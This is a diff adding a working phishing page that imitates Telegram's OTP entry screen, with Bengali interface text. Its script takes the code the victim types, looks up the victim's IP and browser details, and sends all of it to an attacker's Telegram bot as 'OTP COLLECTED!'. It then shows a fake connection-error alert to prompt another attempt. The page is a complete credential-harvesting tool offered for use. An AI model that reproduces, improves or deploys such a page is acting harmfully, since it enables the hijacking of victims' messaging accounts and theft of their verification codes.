@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram - Enter OTP</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ffa500 100%);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .glass-card {
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.15);
+            border: 1px solid rgba(255,255,255,0.3);
+            text-align: center;
+        }
+        .otp-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff6b6b, #ffa500);
+            border-radius: 20px;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+        }
+        h1 {
+            color: #333;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+        .desc {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        #otpInput {
+            width: 100%;
+            padding: 20px;
+            font-size: 24px;
+            text-align: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            letter-spacing: 8px;
+            background: white;
+            font-weight: 600;
+        }
+        #otpInput:focus {
+            border-color: #ff6b6b;
+            box-shadow: 0 0 0 4px rgba(255,107,107,0.1);
+            outline: none;
+        }
+        #timer {
+            color: #ff6b6b;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        .verify-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ffa500 100%);
+            border: none;
+            border-radius: 16px;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .verify-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(255,107,107,0.4);
+        }
+    </style>
+</head>
+<body>
+    <div class="glass-card">
+        <div class="otp-icon">🔑</div>
+        <h1>Enter OTP Code</h1>
+        <p class="desc">We sent 6-digit code to your number. Enter it below:</p>
+        
+        <input type="text" id="otpInput" maxlength="6" inputmode="numeric">
+        <div id="timer">01:30</div>
+        
+        <button class="verify-btn" id="verifyBtn">Verify OTP</button>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        const chatId = urlParams.get('chatid');
+
+        // Timer
+        let seconds = 90;
+        const timerEl = document.getElementById('timer');
+        const timer = setInterval(() => {
+            seconds--;
+            const m = Math.floor(seconds/60);
+            const s = seconds%60;
+            timerEl.textContent = `0${m}:${s<10?'0'+s:s}`;
+            if (seconds <= 0) clearInterval(timer);
+        }, 1000);
+
+        document.getElementById('verifyBtn').onclick = async () => {
+            const otp = document.getElementById('otpInput').value;
+            if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+                alert('6 অঙ্কের OTP দিন!');
+                return;
+            }
+
+            const ip = await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(r=>r.ip);
+            
+            const message = `🔥 <b>OTP COLLECTED!</b>\n\n` +
+                          `📱 <b>OTP:</b> <code>${otp}</code>\n` +
+                          `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                          `💻 <b>Device:</b> ${navigator.userAgent.slice(0,40)}...\n` +
+                          `🕐 <b>Time:</b> ${new Date().toLocaleString('bn-BD')}`;
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            alert('কানেকশন এরর! আবার চেষ্টা করুন।');
+        };
+    </script>
+</body>
+</html>
